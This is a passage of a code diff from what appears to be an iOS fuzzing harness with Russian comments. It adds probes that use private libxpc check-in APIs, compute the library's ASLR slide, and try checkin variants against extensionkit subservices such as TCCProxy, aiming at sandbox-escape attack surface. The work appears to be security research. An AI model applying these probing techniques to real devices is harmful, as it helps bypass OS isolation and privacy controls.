+        char *d = xpc_copy_description(ev);
+        LOG("[bq53] %s ev#%d %s bsxpc=%s: %.600s", ls.UTF8String, nev + 1,
+            isErr ? "[ERR]" : "[MSG]", tag ?: "-", d ?: "?");
+        free(d);
+        nev++;
+    });
+    // приватный API ДО resume (обязательно до: state conn+0x40 == 0)
+    xpc_connection_set_bs_type(c, (uint64_t)bstype);
+    LOG("[bq53] %s set_bs_type(%d) вернулся (TBD-only для kind==0)", label, bstype);
+    if (dict) {
+        bool ok = xpc_connection_set_bs_checkin_info(c, dict);
+        LOG("[bq53] %s set_bs_checkin_info -> %d%s", label, (int)ok,
+            ok ? " (СЛОТ ЗАПОЛНЕН)" : " (FAIL)");
+    } else {
+        LOG("[bq53] %s БЕЗ чекина (контроль)", label);
+    }
+    xpc_connection_resume(c);
+    // чекин уходит в setup при resume — реакция сервера:
+    for (int t = 0; t < 25 && nev == 0; t++) usleep(100000);
+    LOG("[bq53] %s после resume+2.5s nev=%d (%s)", label, nev,
+        nev == 0 ? "MOLCH — ЧЕКИН ПРИНЯТ?" : "ОТВЕТ/РЕДЖЕКТ");
+    for (int i = 0; i < nseq; i++) {
+        xpc_connection_send_message(c, seq[i]);
+        usleep(400000);
+    }
+    for (int t = 0; t < 15 && nev < 1 + nseq; t++) usleep(100000);
+    LOG("[bq53] %s total nev=%d", label, nev);
+    done = YES;
+    xpc_connection_cancel(c);
+}
+
+static void p_bq53(void) {
+    LOG("[bq53] v202: checkin через приватный libxpc-API (bs_type=TBD, "
+        "экспортированные символы)");
+    // slide для журнала (адреса подтверждены dlsym'ом в v201)
+    void *pub = dlsym(RTLD_DEFAULT, "xpc_connection_create");
+    Dl_info di;
+    memset(&di, 0, sizeof(di));
+    if (pub && dladdr(pub, &di)) {
+        uint64_t rtbase = (uint64_t)(uintptr_t)di.dli_fbase;
+        LOG("[bq53] libxpc runtime base %#llx slide %#llx",
+            (unsigned long long)rtbase,
+            (unsigned long long)(rtbase - 0x180599000ULL));
+    }
+    LOG("[bq53] dlsym(set_bs_type)=%p dlsym(set_bs_checkin_info)=%p",
+        dlsym(RTLD_DEFAULT, "xpc_connection_set_bs_type"),
+        dlsym(RTLD_DEFAULT, "xpc_connection_set_bs_checkin_info"));
+    fsync(fileno(stderr));
+
+    dispatch_queue_t q = dispatch_queue_create("bq53.q", DISPATCH_QUEUE_SERIAL);
+    int ctl = 0;
+    char tag[64];
+
+    // 2) КОНТРОЛЬ A: голое {} без чекина -> invalidate (§144)
+    {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_object_t seq[1] = { m };
+        bq51_run(q, "ctl-empty", seq, 1, 1, &n, tag, sizeof(tag));
+        if (!strcmp(tag, "invalidate")) ctl = 1;
+        LOG("[bq53] ctl-empty: nev=%d tag=%s -> control %s",
+            n, tag[0] ? tag : "-", ctl ? "OK" : "FAILED");
+    }
+    if (!ctl) {
+        LOG("[bq53] CONTROL FAILED — вердикты не выносятся (§144)");
+        return;
+    }
+
+    // V0: bs_type=1 (TBD), БЕЗ чекина -> 'w00t' setup без чекина ->
+    //     серверу нечего декодить -> invalidate (ожидаемо)
+    {
+        xpc_object_t act = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(act, "bsxpc", "activate");
+        xpc_object_t seq[1] = { act };
+        bq53_dialog(q, "V0-nocheckin", 1, NULL, seq, 1);
+    }
+    // V1: bs_type=1, чекин lp-only -> wrap-fail -> invalidate (ожидаемо)
+    {
+        xpc_object_t d = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(d, "lp", "BSXPC(com.apple.fuzz27)");
+        xpc_object_t act = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(act, "bsxpc", "activate");
+        xpc_object_t seq[1] = { act };
+        bq53_dialog(q, "V1-lp-only", 1, d, seq, 1);
+    }
+    // V2..V5: bs_type=1, чекин {lp, s} по каждому сервису + диалог
+    static const char *svcs[] = { "TCCProxy", "Discovery", "Launch", "Observer" };
+    for (int i = 0; i < 4; i++) {
+        char lbl[32];
+        snprintf(lbl, sizeof(lbl), "V%d-s=%s", i + 2, svcs[i]);
+        xpc_object_t d = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(d, "lp", "BSXPC(com.apple.fuzz27)");
+        xpc_dictionary_set_string(d, "s", svcs[i]);
+        xpc_object_t act = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(act, "bsxpc", "activate");
+        xpc_object_t sel = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(sel, "bsxpc_SEL", "description");
+        xpc_object_t seq[2] = { act, sel };
+        bq53_dialog(q, lbl, 1, d, seq, 2);
+    }
+    // V6: bs_type=1, чекин {lp, mx=false} -> ROOT-путь
+    {
+        xpc_object_t d = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(d, "lp", "BSXPC(com.apple.fuzz27)");
+        xpc_dictionary_set_bool(d, "mx", false);
+        xpc_object_t act = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(act, "bsxpc", "activate");
+        xpc_object_t sel = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(sel, "bsxpc_SEL", "description");
+        xpc_object_t seq[2] = { act, sel };
+        bq53_dialog(q, "V6-mx-root", 1, d, seq, 2);
+    }
+    // V7: bs_type=1, чекин {lp, s=TCCProxy, i=default}
+    {
+        xpc_object_t d = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(d, "lp", "BSXPC(com.apple.fuzz27)");
+        xpc_dictionary_set_string(d, "s", "TCCProxy");
+        xpc_dictionary_set_string(d, "i", "default");
+        xpc_object_t act = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(act, "bsxpc", "activate");
+        xpc_object_t sel = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(sel, "bsxpc_SEL", "description");
+        xpc_object_t seq[2] = { act, sel };
+        bq53_dialog(q, "V7-TCCProxy+i", 1, d, seq, 2);
+    }
+    LOG("[bq53] done");
+    LOG("[bq53] VERDICT: строки 'MOLCH — ЧЕКИН ПРИНЯТ?' = слот доставлен "
+        "и принят сервером (гейты port-derivation/CS пройдены) — читать "
+        "ev-строки диалога (activate/SEL); invalidate на полном чекине "
+        "при живых контролях = серверный гейт режет чекин — RE 0x1805b4784 "
+        "(port-derivation) и 0x1805b65xx (CS-requirement) следующая итерация");
+}
+
 
 // p_astris — v192: существует ли AppleAstrisGpioProbe в IORegistry
 // УСТРОЙСТВА из песочницы (matching без open, нулевой риск) и что
@@ -36205,7 +37541,9 @@ static void p_xpcenum(void) {
     LOG("[xpcen] v194 XPC-service reachability from sandbox");
     // FUZZ_XPCENUM=2 — быстрый режим: без перечисления (уже сделано),
     // только сбор статики по известному reachable-сервису.
-    int fast = getenv("FUZZ_XPCENUM")[0] == '2';
+    // FUZZ_XPCENUM=3 — пробы адресации подсервисов BS-домена (v195).
+    const char *xm = getenv("FUZZ_XPCENUM");
+    int fast = xm[0] == '2' || xm[0] == '3';
     int npos = 0, nctl = 0, nerr = 0, nnone = 0;
     unsigned done = 0;
     NSMutableArray<NSString *> *cands = [NSMutableArray array];
@@ -36308,7 +37646,7 @@ static void p_xpcenum(void) {
             (npos > 0 || nctl == 1)
                 ? "detector valid; pos>0 — reachable XPC services см. [POS]"
                 : "inconclusive (ни позитива, ни контрольного invalid)");
-    } else {
+    } else if (xm[0] == '2') {
         LOG("[xpcen] fast mode: перечисление пропущено, статика-сбор");
         npos = 1; nctl = 1;   // результат перечисления уже известен (v194)
         // v194d: BSServiceDomains объявляет 4 подсервиса (Discovery,
@@ -36341,6 +37679,66 @@ static void p_xpcenum(void) {
             xpc_connection_send_message(c, ping);
             for (int t = 0; t < 10 && !got; t++) usleep(100000);
             if (!got) LOG("[xpcen] probe %s: no event in 1s", pns.UTF8String);
+            xpc_connection_cancel(c);
+        }
+    } else if (xm[0] == '3') {
+        // v195: адресация подсервисов BS-домена. RE ExtensionFoundation
+        // (карв .01, xref "com.apple.extensionkitservice"): подсервис
+        // передаётся ИМЕНЕМ рядом с созданием соединения (в коде видна
+        // small-string "Discovery"); строки-соседи: "AppExtensionLaunch",
+        // "SceneSessionService", "com.apple.extensionkit". Пробуем формы
+        // имени как connection name + {"service": X} на base-соединении.
+        NSArray<NSString *> *forms = @[
+            @"com.apple.extensionkit.Discovery", @"com.apple.extensionkit.Launch",
+            @"com.apple.extensionkit.Observer",  @"com.apple.extensionkit.TCCProxy",
+            @"Discovery", @"Launch", @"Observer", @"TCCProxy",
+            @"AppExtensionLaunch", @"SceneSessionService",
+            @"com.apple.extensionkit._EXDiscoveryController",
+            @"com.apple.extensionkit",
+        ];
+        for (NSString *pn in forms) {
+            __block BOOL got = NO; __block BOOL isErr = YES;
+            NSString *pns = pn;
+            xpc_connection_t c = xpc_connection_create(pn.UTF8String, q);
+            if (!c) { LOG("[xpcen] addr %s: create NULL", pn.UTF8String); continue; }
+            xpc_connection_set_event_handler(c, ^(xpc_object_t ev) {
+                if (got) return;
+                isErr = xpc_get_type(ev) == XPC_TYPE_ERROR;
+                char *ds = xpc_copy_description(ev);
+                LOG("[xpcen] addr %s %s: %.500s", pns.UTF8String,
+                    isErr ? "[ERR]" : "[POS]", ds ? ds : "?");
+                free(ds); got = YES;
+            });
+            xpc_connection_resume(c);
+            xpc_object_t ping = xpc_dictionary_create(NULL, NULL, 0);
+            xpc_connection_send_message(c, ping);
+            for (int t = 0; t < 8 && !got; t++) usleep(100000);
+            if (!got) LOG("[xpcen] addr %s: no event in 0.8s", pns.UTF8String);
+            xpc_connection_cancel(c);
+        }
+        // Batch B: bootstrap-ключи на base-соединении (подсервис TCCProxy)
+        NSArray<NSString *> *keys = @[ @"service", @"serviceName", @"domain",
+                                       @"_service", @"xpc.service" ];
+        for (NSString *k in keys) {
+            __block BOOL got = NO; __block BOOL isErr = YES;
+            NSString *ks = k;
+            xpc_connection_t c = xpc_connection_create(
+                "com.apple.extensionkitservice", q);
+            if (!c) continue;
+            xpc_connection_set_event_handler(c, ^(xpc_object_t ev) {
+                if (got) return;
+                isErr = xpc_get_type(ev) == XPC_TYPE_ERROR;
+                char *ds = xpc_copy_description(ev);
+                LOG("[xpcen] msg {%s:TCCProxy} %s: %.500s", ks.UTF8String,
+                    isErr ? "[ERR]" : "[POS]", ds ? ds : "?");
+                free(ds); got = YES;
+            });
+            xpc_connection_resume(c);
+            xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+            xpc_dictionary_set_string(m, k.UTF8String, "TCCProxy");
+            xpc_connection_send_message(c, m);
+            for (int t = 0; t < 8 && !got; t++) usleep(100000);
+            if (!got) LOG("[xpcen] msg {%s:TCCProxy}: no event", ks.UTF8String);
             xpc_connection_cancel(c);
         }
     }
@@ -43220,6 +44618,14 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ43")) { p_bq43(); LOG("[probe13] bq43-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ44")) { p_bq44(); LOG("[probe13] bq44-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ45")) { p_bq45(); LOG("[probe13] bq45-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ46")) { p_bq46(); LOG("[probe13] bq46-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ47")) { p_bq47(); LOG("[probe13] bq47-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ48")) { p_bq48(); LOG("[probe13] bq48-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ49")) { p_bq49(); LOG("[probe13] bq49-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ50")) { p_bq50(); LOG("[probe13] bq50-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ51")) { p_bq51(); LOG("[probe13] bq51-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ52")) { p_bq52(); LOG("[probe13] bq52-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ53")) { p_bq53(); LOG("[probe13] bq53-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
